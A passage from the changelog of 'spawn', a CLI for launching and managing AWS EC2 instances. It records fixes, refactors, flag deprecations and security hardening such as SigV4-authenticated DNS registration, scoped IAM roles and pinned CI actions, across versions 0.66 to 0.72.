  instance (e.g. `spore-sync`'s `mutagen` target) can now use `{{ instance.ip }}`.
- **`spawn plugin` commands accept an instance ID for `--instance`.** They
  previously passed the `--instance` value straight to `ssh`, so only a hostname
  or IP worked; an EC2 instance ID (which every other `spawn` command accepts)
  failed to connect. The plugin commands now resolve an instance ID to its public
  IP, connecting as the instance's local user (or `--user`).
- **Plugin local provision steps now inherit the caller's `PATH`.** The local
  executor previously forced a fixed `PATH` that omitted common tool locations
  (notably Homebrew's `/opt/homebrew/bin` on Apple Silicon), so provision tools
  like `mutagen` and `globus-cli` were "command not found". `PATH` (and `HOME`)
  are now inherited — they are not credentials — while other environment
  variables are still dropped to avoid leaking secrets to plugin steps.

### Fixed
- **Launching from a machine whose username has capitals or dots no longer fails,
  and `spawn connect` logs you in as your own user.** The instance creates a
  local user matching your controller login and installs your key for it — but
  the username was passed through verbatim, so a macOS/Windows name like
  `SFriedman` or `john.doe` was rejected by the bootstrap's POSIX validation and
  the launch failed. spawn now normalizes it to a valid login (`SFriedman` →
  `sfriedman`, `john.doe` → `john-doe`; falls back to `spore`). And `spawn
  connect` now defaults to that local-matching user (from the
  `spawn:local-username` tag) instead of `ec2-user`, so you log in as *you*
  (verified: `whoami` → your name, `HOME=/home/<you>`). Windows has no per-user
  account — its key is authorized for `Administrator`, which `spawn connect`
  still uses there. `--user` overrides on both.
- **`spawn plugin install` now waits for the instance to be fully provisioned
  before running remote steps.** It previously went straight to the remote
  install/configure the moment SSH was reachable, racing cloud-init — so on a
  freshly-launched instance the local user, keys, or network/DNS might not be
  ready, causing intermittent failures. It now gates on the same deterministic
  readiness signal `spawn launch` uses (spored active over SSM, which coincides
  with cloud-init finishing). Best-effort: proceeds with a warning if readiness
  can't be confirmed (e.g. a bare hostname with no resolvable instance).
- **The local-matching user can no longer be locked out by a silent SSH-key
  substitution** (#349). When launched with a key pair that has no local `.pub`
  file (e.g. one created via `aws ec2 create-key-pair`, which returns only the
  private key), `spawn launch` silently installed `~/.ssh/id_rsa.pub` for the
  instance's local user instead — so SSHing in as that user with the named key
  failed `Permission denied`, which also broke DNS registration. spawn now
  derives the public key from the private key when no `.pub` exists (and errors
  loudly rather than substituting a different key). DNS registration connects as
  the local-matching user (`$USER`), never a hardcoded `ec2-user` (the default
  login user varies by distro).
- **`spawn launch` output no longer stacks dozens of progress boxes when piped
  or captured.** The animated box redraw relied on an ANSI clear-screen that does
  nothing when stdout isn't a terminal, so every step reprinted the whole box.
  Launch now detects a non-TTY stdout and prints a clean one-line-per-step log
  instead, keeping the in-place redraw only for interactive terminals.
- **Progress boxes now align.** The `🚀`/`🎉` emoji are double-width but were
  counted as one column, so the box's right border was ragged. Padding now
  accounts for wide runes.
- **`spawn launch` success now suggests `spawn connect <name>` instead of a raw
  `ssh -i ~/.ssh/id_rsa …` command.** The old hint hardcoded `~/.ssh/id_rsa`,
  which fails with "Permission denied" whenever the instance was launched with a
  different key; `spawn connect` resolves the actual launch key (and falls back
  to Session Manager).
- **DNS registration failures now report the real reason, and connect over
  IPv4.** The step SSH'd into the instance as the local `$USER` (which the EC2
  key doesn't authorize, so it failed before even calling the API) and reported a
  generic "DNS API call failed". It now connects as the local-matching user, and
  the API call forces IPv4 (`curl -4`) — the dns-updater Lambda URL is dual-stack
  but IPv4-only instances have no IPv6 route, so curl could otherwise pick an
  AAAA address and fail to connect. Failures now surface the actual HTTP
  status/body (e.g. `DNS API returned HTTP 404: …`). DNS registration remains
  non-fatal, and the message points at the public IP / `spawn connect` fallback.
- **Plugins no longer orphan controller-side resources on removal or
  termination.** A plugin's local deprovision steps (e.g. `spore-sync`'s
  `mutagen sync terminate`, `globus`'s endpoint delete) were never run — not even
  by `spawn plugin remove` — so the sync session / registered endpoint leaked on
  the controller. `spawn plugin install` now records what it created locally
  (config + captured outputs + the deprovision steps) under `~/.spawn/plugins/`,
  and both `spawn plugin remove` and `spawn terminate` replay those deprovision
  steps to tear the local footprint down. Persisting the captured outputs is what
  lets a deprovision step reference a provision-time value (e.g. the Globus
  `{{ outputs.endpoint_id }}`) that otherwise lived only in memory. `spawn stop` /
  `hibernate` deliberately leave the footprint in place (they are resumable).
  Reaper- or spot-initiated termination cannot reach the controller and so
  cannot run local deprovision — a known best-effort gap.
- **Plugin templates now fail loudly on non-canonical references instead of
  silently rendering `<no value>`.** The one supported reference syntax is
  `{{ instance.<key> }}`, `{{ config.<key> }}`, `{{ outputs.<key> }}`, and
  `{{ pushed.<key> }}` (lowercase). Any other expression — notably the Go-style
  `{{ .Config.x }}` / `{{ .Instance.Name }}` — is now a hard error at render
  time and is reported by `spawn plugin validate` offline, rather than expanding
  to an empty string at install time. This closes a class of silent plugin
  breakage (e.g. the `tailscale` and `spore-sync` registry plugins were
  rendering their auth key / sync target to nothing).

## [0.72.0] - 2026-07-12

### Changed
- **Internal: guardrail test locks `cmd/`'s AWS-SDK surface** (#327). A new test
  (`cmd/aws_imports_test.go`) fails if a `cmd/*.go` file imports an
  `aws-sdk-go-v2/service/*` package outside a per-file allowlist, so new AWS work
  in the CLI layer must go through a `pkg/*` store/client (the pattern the #326
  extraction established). The allowlist also flags entries that are no longer
  used, so it shrinks as more logic moves into `pkg/*`. No runtime change. Part
  of the 2026-07-11 audit (#328).
- **Internal: `cmd/bot.go` now uses a `pkg/bot` store** (#326), no behavior
  change. Added `pkg/bot` (`Client` mirroring `pkg/alerts.Client`) with the
  `Registration`/`Workspace`/`ConnectCode` item types and the registry,
  workspace, and connect-code methods (upsert/enable/list/batch-delete,
  put/get/list/delete/token-update, redeem), and rewired all `notify`
  subcommands + helpers off raw DynamoDB. `dynamodbav` tags and the (env-resolved)
  table names are unchanged — a check confirms the tags match the previous
  `cmd/` structs, which the separate spore-bot Lambda repo also depends on.
  This completes the store-layer extraction (#326). Part of the 2026-07-11
  audit (#328).

### Fixed
- **Root-volume size/encryption overrides now apply on Ubuntu/Rocky (and other
  `/dev/sda1`) AMIs** (#284). `Launch` hardcoded the root block device to
  `/dev/xvda`; for AMIs whose registered root device is `/dev/sda1` (Ubuntu,
  Rocky, Debian, many marketplace images) the `--volume-size`/encryption
  settings landed on a non-root device, so EC2 silently kept the AMI's default
  (often 8–20 GB) root and could attach a stray volume. spawn now derives the
  root device name from the AMI's `RootDeviceName` (reusing the existing
  `DescribeImages` call — no extra API round-trip) and builds the root mapping
  against it, falling back to `/dev/xvda` only when the lookup fails.
- **`spawn collect-results` now reads the sweep table from the correct account,
  and builds the right results-bucket path** (#326). It loaded the caller's
  default AWS account (while `spawn list-sweeps` — reading the same
  `spawn-sweep-orchestration` table — used the spore-host-infra account), so it
  often found no sweep. It now uses the infra account like `list-sweeps`.
  Separately, its result-bucket path read a `account_id` attribute that the
  orchestrator never writes (it writes `aws_account_id`), so the path was
  malformed (`spawn-results--<region>`); it now reads the real account id.

### Changed
- **Internal: `cmd/list-sweeps.go` and `cmd/collect.go` now use a `pkg/sweep`
  store** (#326), no wire-format change. Added `sweep.Store` (`List`/`Get`,
  mirroring `pkg/alerts.Client`) over the existing `SweepRecord`, and replaced
  list-sweeps' inline anonymous struct and collect's hand-rolled
  `types.AttributeValue` parsing (+ its duplicate `SweepRecord`/`RegionProgress`)
  with the shared typed record. `dynamodbav` tags and the table name are
  unchanged. Part of the 2026-07-11 audit (#328).
- **Internal: `cmd/team.go` now uses a `pkg/team` store** (#326), no behavior
  change. Added `pkg/team` (`Client` mirroring `pkg/alerts.Client`) with the
  `TeamRecord`/`MemberRecord` item types and CRUD/query methods, and rewired all
  six `team` subcommands off raw DynamoDB (retired the `teamDDBClient` helper).
  The `dynamodbav` tags and table names are unchanged (a test confirms the tags
  match the previous `cmd/` structs, which the dashboard-api Lambda also depends
  on). Part of the 2026-07-11 audit (#328).
- **Internal: `cmd/pipeline.go` now uses a `pkg/pipeline` store** (#326), no
  behavior change. Added `pipeline.Store` (wrapping `*dynamodb.Client`, mirroring
  `pkg/alerts.Client`) with `Put`/`Get`/`ListByUser`/`SetCancelRequested`, and
  rewired the launch/status/collect/list/cancel commands off raw DynamoDB calls.
  The launch write now marshals the typed `PipelineState` instead of an ad-hoc
  `map[string]interface{}` — a test asserts the emitted DynamoDB attributes are
  byte-identical to the old map, so the wire format the orchestrator Lambda reads
  is unchanged. Part of the 2026-07-11 audit (#328).

## [0.71.0] - 2026-07-11

### Changed
- **Internal: extracted step helpers from `launchWithProgress`** (#319), no
  behavior change. The single-instance launch orchestrator (743 lines) now
  delegates its early setup phases to `ensureAMIAndPreflight`, `ensureIAMProfile`,
  and `ensureSecurityGroup`, dropping to ~625 lines and reading as a sequence of
  named steps. The gnarly FSx-provisioning block and the launch/wait/DNS tail
  are left inline (they thread local state through to post-launch), and the
  `count > 1` job-array early-return stays in the parent. Part of the 2026-07-11
  audit (#328, Phase 3).
- **Internal: de-duplicated the parallel-launch idiom** (#320), no behavior
  change. The parameter-sweep (`launchAllAtOnce`) and job-array (`launchJobArray`)
  paths each hand-rolled the same goroutine-fan-out + result-collect with a
  private `launchResult` struct. Extracted a shared `runLaunchBatch` helper (new
  `cmd/launch_batch.go`) that owns the fan-out; each caller keeps its own
  post-processing, including the deliberately-different partial-failure handling
  (sweeps keep successful instances since parameter sets are independent; a job
  array terminates its successes on any failure since it's a unit — the #220
  cleanup, preserved verbatim). Part of the 2026-07-11 audit (#328, Phase 3).
- **Internal: split the oversized `pkg/aws/client.go`** (#322), no behavior
  change. Moved cohesive method clusters into sibling files in the same package
  — tag construction → `tags.go`, security-group helpers → `securitygroup.go`,
  EBS block-device/volume-sizing → `ebs.go`, and the spored IAM-role setup →
  the existing `iam.go` — leaving `client.go` as construction + core instance
  lifecycle (2379 → ~1340 LOC). Also extracted the spored role's inline
  assume-role trust policy to a named `sporedTrustPolicy` const (#323) and added
  section comments to `buildTags` (#324). Public API unchanged. Part of the
  2026-07-11 audit (#328, Phase 3).
- **Internal: split the oversized `cmd/launch.go`** (#318), no behavior change.
  The 4333-LOC file (the largest in the repo) is now ~9 focused same-package
  files by concern: `launch_flags.go` (flag vars + `init`), `launch_single.go`
  (single-instance path), `launch_sweep.go`, `launch_jobarray.go`,
  `launch_batchqueue.go`, `launch_config.go` (config + user-data building),
  `launch_preflight.go`, `launch_regions.go`, `launch_posthook.go`. Pure
  reorganization — the CLI command/flag tree is byte-identical. Part of the
  2026-07-11 audit (#328, Phase 3).
- **Internal: split the oversized `cmd/autoscale.go`** (#321), no behavior
  change. The 1417-LOC file is now grouped into same-package files by concern —
  `autoscale_launch.go`, `autoscale_status.go`, `autoscale_policy.go`,
  `autoscale_lifecycle.go`, `autoscale_schedule.go`, `autoscale_helpers.go` —
  with the cobra command definitions + flag block + `init` staying in
  `autoscale.go`. CLI command/flag tree byte-identical. Part of the 2026-07-11
  audit (#328, Phase 3).

### Deprecated
- **Flag names aligned across commands** (#309, #310, #311, #312, #313, #314).
  Each concept now has one canonical flag name everywhere; the old spellings
  still work but are deprecated and hidden from `--help`:
  - `--subnet` → **`--subnet-id`** (`spawn launch`)
  - `--key-pair` → **`--key-name`** (`spawn launch`)
  - `--security-group` / `--security-groups` / `--security-group-id` →
    **`--security-group-ids`** (`launch`, `autoscale launch`, `burst`,
    `image import`). `spawn launch` now accepts **multiple** security groups
    (it previously took only one).
  - `--tags` → **`--tag`** (`spawn autoscale launch`), matching the repeatable
    `key=value` form used by `spawn launch`.
  - `--output`/`-o` used as a file/dir path → **`--output-file`** or
    **`--output-dir`** (`queue results`, `queue template generate`,
    `queue template init`, `slurm convert`, `pipeline collect`). The local
    flag shadowed the root `-o/--output` format flag (same class of bug as the
    `validate -o json` fix); the path flags are renamed and `--output` kept as
    a deprecated alias.
  - `pipeline launch --detached` is deprecated: pipeline launch is always async,
    so the flag never had an effect (use `--wait` to block).
  A guard test (`flag_conventions_test.go`) now fails if any of these historical
  spellings is reintroduced without `MarkDeprecated`. Part of the 2026-07-11
  audit (#328, Phase 2).

### Changed
- **`notify workspace-*` commands are now a `notify workspace` subgroup** (#305).
  Use `spawn notify workspace add|remove|list|destroy` instead of the old
  flat-hyphenated `notify workspace-add` etc. The flat names still work as
  hidden, deprecated aliases (they print a pointer to the new form), so existing
  scripts keep running. The `remove` verb keeps its `-y/--yes` prompt and
  `destroy` keeps its `--confirm` dry-run gate. Part of the 2026-07-11 audit
  (#328, Phase 2).
- **`autoscale *-schedule` commands are now an `autoscale schedule` subgroup**
  (#306). Use `spawn autoscale schedule add|remove|list` instead of the old
  flat `autoscale add-schedule`/`remove-schedule`/`list-schedules`. This also
  removes the confusing overlap with the top-level `spawn schedule` (parameter
  sweeps). The flat names remain as hidden, deprecated aliases so existing
  scripts keep working; `schedule remove` keeps its `-y/--yes` prompt. Part of
  the 2026-07-11 audit (#328, Phase 2).

### Added
- **`spawn autoscale list`** (#299). Lists all active auto-scaling groups. The
  bare `spawn autoscale status` (no group name) already showed this table and
  still does; `list` (alias `ls`) makes the intent explicit and matches the
  `list`/`status` split used elsewhere. Purely additive — no existing command
  changes.

### Changed
- **`--regions` is now consistent across commands** (#300). `spawn availability`,
  `collect`, `sweep collect`, `stage upload`, and `stage estimate` previously took
  `--regions` as a raw comma-string; they now use the same list flag as `spawn
  list` — accepting comma-separated *or* repeated values and a `-r` shorthand.
  Existing `--regions us-east-1,us-west-2` invocations keep working unchanged.

### Fixed
- **`spawn validate -o json` and `spawn snapshot create -o json` now work** (#301).
  Both commands defined their own local `--output`/`-o` flag that collided with
  the root persistent `-o/--output`, so `validate -o json` failed with "unknown
  shorthand flag". They now read the root output flag like every other command;
  `--output json`/`-o json` selects JSON as expected. No change to the emitted
  JSON or text.
- **`spawn notify workspace-remove` and `spawn autoscale remove-schedule` now
  confirm before deleting** (#285). Both performed an irreversible delete (a
  DynamoDB workspace registration, a scheduled scaling action) with no prompt
  and no way to run them safely. The convention test that guards destructive
  commands keyed on the exact command name, so these hyphenated compound verbs
  (`workspace-remove`, `remove-schedule`) slipped past it. Both now prompt
  before acting and accept `-y`/`--yes` to skip the prompt for scripts; the
  guard test now inspects every hyphen-segment of a verb so future compound
  verbs can't regress.
- **Config-file durations now accept a day unit** (#298). A `ttl`, `idle-timeout`,
  or `completion-delay` written as e.g. `2d` or `1d12h` in a local config was
  silently parsed as `0` (Go's `time.ParseDuration` rejects `d`), quietly
  dropping the setting. Config durations now use the same day-aware parser the
  CLI uses, so `2d` = 48h as expected. Invalid values still fall back to zero.

### Changed
- **Internal: de-duplicated helpers** (#294, #295, #296), no behavior change.
  Collapsed two byte-identical duration/string-truncation helpers into one each,
  routed the CLI TTL parser through the shared `pkg/config` parser (which is
  what fixed #298), and funneled table output through a single `newTableWriter`
  helper for consistent column padding. Part of the 2026-07-11 audit (#328).

### Removed
- **Internal dead-code cleanup** (#286, #287, #288, #289, #291, #292). No
  user-facing behavior change. Removed the unused `pkg/streaming` transport
  library (TCP/gRPC/ZMQ), `pkg/instance` wildcard helpers, unused `pkg/audit`
  context helpers, unused DNS name-decoding helpers (`DecodeAccountID`/
  `GetAccountSubdomain`/`ParseDNSName` and the deprecated package-level
  `GetFQDN`), unused queue dependency helpers (`DependenciesMet`/`GetReadyJobs`),
  a couple of unused `cmd` helpers (`waitForDCV`/`getTagValue`/
  `formatTTLDuration`), and one unused alerts constructor plus one unused
  scheduler method — together with the tests that only covered the removed code
  (~2.4k lines). Part of the 2026-07-11 audit (#328).

## [0.70.0] - 2026-07-08

### Removed
- **`--require-spored` (removed).** The spored-readiness check after launch is now
  unconditional (whenever `spawn launch` waits for SSH). The flag was a footgun:
  its name implied "launch without the spored lifecycle agent," but it never
  controlled whether spored *runs* (the bootstrap always installs + starts it) —
  it only skipped the launch-time *verification*. That misled a field user into
  blaming it for an unrelated termination (#277). Eliminating a spurious off-switch
  on the TTL/idle safety net is squarely spore.host's job — no forgotten bills, no
  zombie instances. If SSM genuinely can't be reached, `--wait-for-ssh=false`
  already skips the whole readiness path honestly; `--terminate-on-error` still
  governs whether a failed check auto-terminates. (Pairs with the #277 Symptom A
  fix, which removed the main reason anyone reached for it.)

### CI
- **Release: the spored S3 upload no longer gets skipped when the Homebrew/Scoop
  tap push fails** (#280). GoReleaser pushes the taps in its last phase; an
  expired tap token failed that step *after* the binaries were built, aborting the
  job and skipping the S3 upload that delivers spored to instances. The AWS + S3
  steps now run with `if: !cancelled()`, so a distribution-token lapse can't block
  spored delivery (a genuinely early GoReleaser failure still fails the S3 step
  loudly on the missing artifacts).

### Documentation
- **`docs/release-tap-token.md`** — runbook for minting/rotating the fine-grained
  PAT that GoReleaser uses to auto-publish the Homebrew tap and Scoop bucket,
  including an expiry-reminder note so it doesn't silently lapse between releases
  again (the root cause behind v0.69.0's tap-push failure, #280).

## [0.69.0] - 2026-07-08

### Security
- **Built with Go 1.26.5** to clear GO-2026-5856, a `crypto/tls` standard-library
  advisory present in go1.26.4 (affects every module built with the toolchain).
  CI/release now pin `go-version: 1.26.5`, so the released binaries link the
  patched stdlib.
- **Bumped `aws-sdk-go-v2` deps in the `dashboard-api` and `scheduler-handler`
  Lambda submodules** to clear GO-2026-5764 (`aws/protocol/eventstream`
  HTTP/eventstream advisory, pulled transitively via `service/s3`/`service/lambda`):
  `eventstream` → v1.7.8, `s3` → v1.97.3, `lambda` → v1.88.5. No code change;
  restores govulncheck to green.
- **Pinned all GitHub Actions to commit SHAs** (with version comments) across
  the CI/security/release workflows, and pinned `trivy-action` from `@master`
  to a release. Clears the Semgrep `github-actions-mutable-action-tag` finding
  and hardens the CI supply chain against tag hijacking.

### Documentation
- **Clarified stop-vs-terminate cost** (#262). `--on-complete` and
  `--hibernate-on-idle` help now note that a *stopped* instance keeps billing for
  its EBS volumes and any attached Elastic IP, and recommend `--on-complete
  terminate` for batch/headless work (especially in accounts without a hosted
  reaper). README gains a "Bounding cost" section and lists the
  `resources`/`orphans`/`cleanup` commands.

### Added
- **`spawn orphans`/`resources` now surface leaked Elastic IPs, and `spawn status`
  reports an instance's attached EIP** (#262). An EIP that is unassociated, or
  attached to a *stopped* spawn instance, keeps billing (~$3.60/mo) — these now
  show up as `address` rows in `orphans`/`resources`. `spawn status <instance>`
  reports any attached Elastic IP: informational while the instance runs, a
  billing warning while it's stopped. spawn never allocates an Elastic IP, so it
  **never releases one** — any EIP shown is a static address you allocated, and
  `orphans`/`cleanup`/`status` all point you at `aws ec2 release-address` rather
  than touching it.
- **Bring-your-own app images + per-account catalog** (spore-host#392). The app
  catalog is now a per-account view: `spawn app list` shows only apps whose image
  your account can pull — public images for everyone, private-ECR images only when
  your account owns them. New flags: `--image <ref>` launches a BYO container
  image for an app (overriding the catalog binding; private-ECR refs trigger an
  `aws ecr get-login-password | docker login` on the instance before the pull),
  and `--catalog <file>` (also `$SPAWN_CATALOG`, `~/.spawn/catalog.yaml`) layers a
  local overlay that adds apps or rebinds images. An app with no resolvable image
  fails fast at launch with guidance instead of a generic timeout. spore.host
  ships only public images; private/personal images live in your overlay.
  `spawn app list` gains a STATUS column: **launchable** (image resolves for your
  account, or a legacy command) vs **recipe available** (a buildable definition —
  build the image per `infra/amis/containers/<app>`, then bind it via overlay or
  `--image`); private images owned by another account are hidden. paraview and
  chimerax now ship as recipes. See `docs/catalog-overlay.example.yaml`.

### Fixed
- **`spawn launch --command` no longer fails its spored-readiness gate on a fresh
  instance** (#277). The gate (`verifySporedReady`) sent `spored status` over SSM
  immediately, but on a just-booted AL2023/Graviton (spot) instance the SSM agent
  hasn't registered yet, so every `SendCommand` failed until the whole gate timed
  out with an opaque "context deadline exceeded" — even though SSH was already up.
  The gate now first waits for the SSM agent to report `PingStatus=Online`
  (reusing `WaitForSSMOnline`, which also **fails fast** if the instance has no IAM
  instance profile, since the agent could then never register), and only then
  polls `spored status`. Gate budget raised 3m → 5m to accommodate agent
  registration on Graviton. (This is #277 Symptom A; the `--require-spored=false`
  early-termination — Symptom B — is tracked separately.)
- **`spawn launch --region <r>` now pins the whole launch to that region** (#276).
  The region flag reached `RunInstances`, but the AWS client was built with
  `LoadDefaultConfig` (no region override), so caller-identity, pricing, and
  AMI/AZ resolution ran in the ambient `AWS_REGION`/`AWS_DEFAULT_REGION`/profile
  region instead — and when region resolution came up empty on those paths the
  latency-based auto-detector could pick a third region entirely (a `--region
  us-west-2` launch landing in `us-west-1`). Launch (and the sweep/batch-queue
  paths) now build the client with `NewClientWithRegion(ctx, config.Region)`, so
  every region-sensitive call uses the resolved launch region.
- **`spawn orphans` no longer reports already-deleted EBS volumes** (#262). State
  enrichment issued one batched `DescribeVolumes`/`DescribeInstances`; EC2 fails
  the *whole* call if any single id is already gone, which left every resource's
  state blank, and a blank volume state was treated as an orphan — so one deleted
  volume made the report list every volume (including deleted ones). Enrichment
  now falls back to a per-id sweep on `NotFound` (survivors keep their real state,
  the gone ones are marked `deleted`), and only a genuinely `available` volume is
  classed as an orphan.
- **Container apps now render into the DCV session's display, not host `:0`**
  (#263). The first real container launch failed with "Unable to open X display
  :0" because `dcv create-session --type virtual` starts its own per-session X
  server (not host `:0`, and `/tmp/.X11-unix` was empty). The session `--init` is
  now a wrapper (`/usr/local/bin/spore-app-run`) that reads DCV's session
  `DISPLAY`/`XAUTHORITY` and passes them into the container, mounting the X socket
  and xauth file.
- **The DCV launch path starts spored via systemd, not `spored monitor`** (#264).
  The removed `monitor` subcommand made spored exit immediately at boot, so the
  `:8444` token verifier never came up and no `spawn:ready-status` was ever
  written (the launch hit the generic timeout). It now installs the canonical
  `spored.service` unit and `systemctl start spored`, matching the standard
  launch path.

### Added
- **`spawn app launch` runs apps from containers on a shared DCV base AMI** (#290).
  A catalog app now launches its Docker image (e.g.
  `public.ecr.aws/spore-host/paraview:5.13.2`) on the shared `spore-dcv-base` AMI
  instead of a baked per-app AMI: the user-data pre-pulls the image and runs it
  into the DCV display as the session, GPU apps with `--gpus all`. New
  `--app-version <tag>` selects the image version (validated against the catalog;
  defaults to the catalog default). `spawn app list` gains a VERSION column. This
  replaces the per-app, per-region AMI table whose IDs were all dangling or
  unshared from the launch account (#389); adding/updating an app is now a
  `docker push`, not a 9-region Packer build.
- **Catalog validation runs in spawn's tests** (#290). Bumped to libs v0.39.0 and
  added a test that runs `catalog.Validate()`, so a stale or malformed catalog (a
  #389-class defect) fails spawn's CI, not just libs'.

### Fixed
- **The DCV readiness handshake now retries and can't bill forever** (spawn#282).
  Three reliability fixes for app streaming: (1) the handshake (session-wait →
  token → `spawn:ready-url`) is now driven from spored's monitor loop instead of a
  one-shot startup goroutine, so a transient failure (slow `dcvserver`, a momentary
  `ec2:CreateTags` throttle) recovers on the next tick — and the CLI-vs-spored
  timer race disappears (spored keeps retrying within the CLI's poll window).
  (2) Idle detection for a DCV instance whose server *never* becomes ready now
  falls back to the standard CPU/network idle checks after a bounded grace, so it
  idle-stops instead of billing until TTL (the old unbounded grace was a silent
  cost leak). (3) Added the missing UDP 8443 (QUIC) ingress rule to the `spawn-dcv`
  security group (added idempotently to pre-existing groups too) so DCV uses its
  low-latency transport instead of silently falling back to TCP.
- **Reconciled the DCV/app-launch spored IAM role** with the standard spored role
  (spawn#282): it previously granted `ec2:CreateTags` on `*` **unconditioned** (the
  #174 tag-then-terminate class) and lacked the FSx-mount (#221) and
  `lambda:InvokeFunctionUrl` (#173 DNS-sign) grants — so a DCV instance couldn't
  mount ephemeral FSx and, after the #173 `AuthType: AWS_IAM` cutover, couldn't
  register DNS. `CreateTags`/`DeleteTags` are now scoped to `spawn:managed=true`
  and both missing grants are included (re-applied on the next `spawn app launch`).

### Changed
- **`spawn app launch` now reports *why* a DCV session didn't come up** instead of
  one opaque `(timed out — DCV login screen will appear)` for every failure
  (spawn#282). spored classifies the handshake into named states written to
  `spawn:ready-status` — `dcv-not-installed`, `dcvserver-not-running`,
  `session-never-created`, `tag-write-denied`, `ready` — and no longer writes a
  ready URL for a session that never appeared. The CLI surfaces the specific cause
  with a remediation hint (e.g. "this AMI has no NICE DCV server", "the DCV server
  failed to start — inspect with spawn connect …"). Pure observability; the
  streaming path is unchanged when it succeeds.
- **Made the DCV handshake testable off-instance** (spawn#282, internal). The
  `dcv` CLI shell-outs and the `spawn:ready-*` tag write now go through small
  injectable seams (`dcvRunner`, `tagPutter`), and the CLI's per-poll tag read is
  an extracted pure helper. New coverage: the monitor-loop retry/terminal logic
  (a transient "session not present" no longer latches, a terminal status stops
  and never writes a fake ready URL) and a Tier-0 Substrate round-trip asserting
  the launch poll recovers the token/host on `ready` and the named reason on a
  failure status — the exact branch that previously only printed the generic
  timeout. No user-visible behavior change.

### Removed
- **Deleted the legacy instance-identity-document auth path from the DNS updater**
  (#173 step 4, the cutover is complete). The `spawn-dns-updater` Function URL now
  runs under `AuthType: AWS_IAM`, so the handler authorizes solely on the
  SigV4-verified caller account; the old spoofable path is gone: removed
  `signature.go` (embedded per-region certs + PKCS#7/RSA verification), the
  `legacyAuthorize`/`validateInstance` fallback and its cross-account default-allow,
  the `instance_identity_document`/`_signature` request fields, and the
  `fullsailor/pkcs7` dependency. A request without a verified IAM authorizer is now
  rejected 403 (can't occur under AWS_IAM; defends against an accidental revert).
  This closes the #173 HIGH Route53-spoofing vulnerability and retires the #294
  cert-maintenance burden for good.

## [0.68.1] - 2026-06-25

### Fixed
- **spored now reliably mounts an async-created ephemeral FSx** (#221, #194). Two
  independent bugs each caused the mount to silently never happen (no log lines,
  empty mount point, workload hanging):
  1. **Startup race.** spored attempted the mount exactly once at boot, reading
     `spawn:fsx-pending` immediately. But the launch path writes that tag *after*
     `RunInstances` (the FSx create + Lustre-port setup take seconds) and EC2 tags
     are eventually consistent, so the tag was often absent at that one read —
     and the mount was never retried. spored now (re)checks for the pending FSx
     on its monitor loop after each config refresh, mounting once the tag appears.
  2. **Missing IAM.** The spored instance role had **no `fsx:*` permissions**, so
     even when the tag was present the mount failed with AccessDenied on
     `fsx:DescribeFileSystems` / `fsx:CreateDataRepositoryAssociation`. The role
     now grants those (re-applied on the next launch). Both CLI and
     lagotto/headless launches are covered.

## [0.68.0] - 2026-06-25

### Added
- **`spawn launch` verifies the spored agent came up, and fails if it didn't**
  (#50). spored installs asynchronously via cloud-init, so a failed install (bad
  download, checksum/arch mismatch, network) previously left a "running" instance
  with no lifecycle agent — no TTL enforcement, no idle stop, no completion
  handling — a silent cost-control hole (a TTL-less zombie). When waiting for
  readiness (`--wait-for-ssh`, the default), launch now confirms `spored status`
  responds over SSM and **fails loudly** if it doesn't, pointing you to inspect or
  terminate the instance. On by default via `--require-spored` (disable with
  `--require-spored=false`); add `--terminate-on-error` to auto-terminate the
  agentless instance instead of leaving it for inspection. Linux only.

### Fixed
- **`spawn status` works on keyless, SSM-only instances** (#222). A
  lagotto/cohort-launched instance has no SSH key (SSM-only by design), so
  `status` previously hard-failed with "no SSH key configured" — yet status needs
  only Describe + SSM, never SSH. It now falls back to running `spored status`
  over SSM (`RunShellScript`) when no local key resolves, including propagating
  spored's `--check-complete` exit code (carried back as the SSM response code).
- **`--command` longer than 256 characters no longer fails the launch** (#214,
  #246). The workload command was delivered via the `spawn:command` EC2 tag, and
  EC2 caps tag values at 256 chars, so any non-trivial inline command failed
  `RunInstances` outright. The plain `--command` is now embedded in the instance's
  user-data (`/etc/spawn/command`, ~16 KB headroom) and the bootstrap prefers it
  over the tag; the tag is still written for short commands (and the
  parameter-sweep path's short per-instance commands), but an oversized command is
  no longer tagged.
- `--hibernate-on-idle` help text no longer says "instead of terminate" — the
  default idle action is **stop**, not terminate, so the old text misrepresented a
  reversible choice as a destructive one (#79).
- **The ttl-reaper now deletes a reaped instance's Route53 DNS records** (#247).
  spored's graceful shutdown deletes its DNS record, but the reaper only fires
  when spored *failed* (dead/wedged/never-ran), so reaped instances were leaking
  their `A` records (and the #121 friendly-name alias `CNAME`) into the zone
  indefinitely. The reaper now performs the teardown itself, out-of-band — it does
  **not** rely on the (dead) daemon — deleting `{dns-name}.{account-base36}.{domain}`
  and, when present, the `{dns-name}.{account-name}.{domain}` alias, using its own
  (infra-account) Route53 credentials. Best-effort and `REAPER_DRY_RUN`-aware; it
  runs after the terminate so it can never block the hard-deadline guarantee.
  Enable by setting `REAPER_DNS_ZONE_ID` + `REAPER_DNS_DOMAIN` (both empty = off,
  so no `route53` IAM is attached). Mirrors the reaper's existing ownership of FSx
  cleanup (#192/#212).
- `scripts/deploy-custom-dns.sh` now builds the Lambda with `go build .` instead
  of `go build main.go` (#248). The single-file build failed
  (`undefined: verifyInstanceIdentitySignature`, which lives in `signature.go`),
  producing a stale/empty `bootstrap`.

## [0.67.0] - 2026-06-25

### Added
- **DNS registration now SigV4-signs its request** to the DNS Lambda Function
  URL, and spored enables it by default (#173). This moves the DNS updater off the
  spoofable instance-identity-document path toward `AuthType: AWS_IAM`, where the
  Lambda authorizes the *cryptographically verified* caller account rather than a
  forgeable document. Three pieces land here:
  - `pkg/dns` SigV4-signs the POST with the instance role's ambient credentials
    when `SPORE_DNS_SIGV4` is set (the principal the Lambda will authorize).
  - spored's systemd unit now sets `SPORE_DNS_SIGV4=1`, so launched instances sign
    automatically — fielding a signing fleet ahead of the `AuthType` flip. A
    signed request against the current `AuthType: NONE` URL is accepted unchanged,
    so this is non-breaking; older non-signing instances age out under their TTLs.
  - the spored instance role grants itself `lambda:InvokeFunctionUrl` on the DNS
    function. This is the scalable alternative to enumerating launch accounts in
    the Lambda's resource policy (accounts are unbounded and spored role names are
    dynamic): each role self-authorizes, and the Lambda enforces that a caller can
    only write records under its own verified account's subdomain.
  - **Note: this does not yet close the vulnerability** — that needs the
    coordinated infra cutover (flip the Function URL to `AuthType: AWS_IAM` + the
    verified-account-namespacing handler, then remove the legacy identity-doc/cert
    code); tracked in #173.

## [0.66.0] - 2026-06-24

### Added
- **`spawn upgrade-spored <instance>`** replaces the spored agent on a running
